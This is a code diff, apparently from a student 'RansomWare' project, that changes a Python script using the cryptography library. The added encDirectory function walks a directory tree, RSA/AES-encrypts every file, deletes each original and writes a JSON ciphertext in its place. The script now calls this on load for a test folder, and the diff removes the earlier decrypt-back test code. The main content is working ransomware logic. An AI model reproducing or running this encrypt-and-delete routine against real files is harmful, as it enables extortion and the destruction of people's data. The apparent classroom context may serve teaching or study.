@@ -6,9 +6,14 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import (hashes, hmac, serialization)
 from cryptography.hazmat.primitives import (padding, asymmetric)
 
-fileToEncrypt = 'C:/Users/Hanson/Desktop/Team-1/RansomWare/TestFiles/Images/image.png'
-rsa_public_key_file_path = "C:/Users/Hanson/Desktop/Team-1/RansomWare/KeyFiles/public.pem"
-rsa_private_key_file_path = "C:/Users/Hanson/Desktop/Team-1/RansomWare/KeyFiles/private.pem"
+### Toggle Comment For PNG, JPG, or TXT File ###
+#fileToEncrypt = './TestFiles/Images/image.png'
+fileToEncrypt = './TestFiles/Images/image.jpg'
+#fileToEncrypt = './TestFiles/Text/test.txt'
+
+
+rsa_public_key_file_path = "./KeyFiles/public.pem"
+rsa_private_key_file_path = "./KeyFiles/private.pem"
 
 
 def check_rsa_keys():
@@ -49,6 +54,21 @@ def check_rsa_keys():
         public_key_file_path.write(public_pem)
         public_key_file_path.close()
 
+
+def encDirectory(directory):
+    # Check for or create RSA keys
+    check_rsa_keys()
+
+    for dirName, subdirList, fileList in os.walk(directory):
+        for fileToEncrypt in fileList:
+            RSACipher, cit, iv, tag, ext = MyRSAEncrypt(os.path.join(dirName, fileToEncrypt).replace("\\","/"), rsa_public_key_file_path)
+            # Create and dump the JSON data into the object
+            jsonObj = createJSON(cit, tag, iv, ext, RSACipher)
+            # Delete original file
+            os.remove(os.path.join(dirName, fileToEncrypt).replace("\\","/"))
+            # Create encrypted json file named the same as the original file with different extension
+            fileName = os.path.splitext(fileToEncrypt)[0] + ".json"
+            createFile(os.path.join(dirName, fileName).replace("\\","/"), jsonObj)
 
 def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
     # Encrypt the file
@@ -92,10 +112,6 @@ def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
     # Separate the Key and HMACKeys
     ekey = keys[0:32]
     hkey = keys[32:len(keys)]
-    # Decrypt the ciphertext using the keys
-    # message = MyDecrypt(C, ekey, IV, tag, hkey)
-    # Display Message
-    # print(message) ### CHANGE THIS LINE TO RETURN A FILE INSTEAD OF PRINTING THE MESSAGE ###
 
     return ekey, hkey
 
@@ -191,6 +207,7 @@ def createJSON(cit, tag, iv, ext, RSACipher):
     jsonData['iv'] = iv.decode('ISO-8859-1')
     jsonData['RSACipher'] = RSACipher.decode('ISO-8859-1')
     jsonData['extension'] = ext
+    jsonData['createdBy'] = 'Team1'
     return json.dumps(jsonData)
 
 
@@ -199,35 +216,4 @@ def createFile(fileName, jsonObj):
     f.write(jsonObj)
     f.close()
 
-
-
-## TESTING FUNCTIONS HERE ##
-# Encrypt the file contents
-check_rsa_keys()
-
-#cit, tag, iv, key, ext, hkey = MyFileEncrypt(fileToEncrypt)
-
-################################################################
-# This line of code needs the filepath to the public key to work
-RSACipher, cit, iv, tag, ext = MyRSAEncrypt(fileToEncrypt, rsa_public_key_file_path)
-################################################################
-
-# Create and dump the JSON data into the object
-jsonObj = createJSON(cit, tag, iv, ext, RSACipher)
-# Delete original file
-os.remove(fileToEncrypt)
-# Create encrypted json file named the same as the original file with different extension
-fileName = os.path.splitext(fileToEncrypt)[0] + ".json"
-createFile(fileName, jsonObj)
-
-#m, e = MyFileDecrypt(fileName, rsa_private_key_file_path)
-#decrypted_file = open(os.path.splitext(fileToEncrypt)[0] + "Decrypted" + e, "wb")
-#decrypted_file.write(m)
-#decrypted_file.close()
-
-# Works with Images again
-message, ext = MyFileDecrypt(fileName, rsa_private_key_file_path)
-newFileName = os.path.splitext(fileToEncrypt)[0] + "Decrypted" + ext
-newFile = open(newFileName, "wb")
-# Write the message to the file
-newFile.write(message)
+encDirectory('./TestFiles/EncryptThese')
